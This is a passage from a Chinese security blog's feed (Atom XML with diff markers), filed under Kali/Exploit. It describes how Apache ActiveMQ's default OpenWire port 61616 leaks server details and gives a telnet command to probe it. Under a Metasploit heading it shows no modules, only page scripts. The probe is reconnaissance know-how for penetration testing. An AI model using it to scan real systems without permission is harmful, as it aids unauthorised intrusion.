ActiveMQ默认消息队列61616端口对外，61616端口使用了OpenWire协议，这个端口会暴露服务器相关信息，这些相关信息实际上是debug信息,会返回应用名称，JVM，操作系统以及内核版本等信息。</p><h3 id="telnet测试"><a href="#telnet测试" class="headerlink" title="telnet测试"></a><code>telnet</code>测试</h3><pre><code>telnet 10.184.67.53 61616</code></pre><h3 id="MSF相关漏洞模块"><a href="#MSF相关漏洞模块" class="headerlink" title="MSF相关漏洞模块"></a>MSF相关漏洞模块</h3><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
-&lt;p&gt;ActiveMQ是Apache使用纯Java语言编写的开源消息中间件,&lt;/p&gt;
-&lt;p&gt;&lt;a href=&quot;https://juejin.cn/post/6844903920209231886&quot;&gt;https://juejin.cn/post/68449</summary>
-      
-    
-    
-    
-    <category term="Kali" scheme="https://askding.github.io/categories/Kali/"/>
-    
-    <category term="Exploit" scheme="https://askding.github.io/categories/Kali/Exploit/"/>
     
     
   </entry>
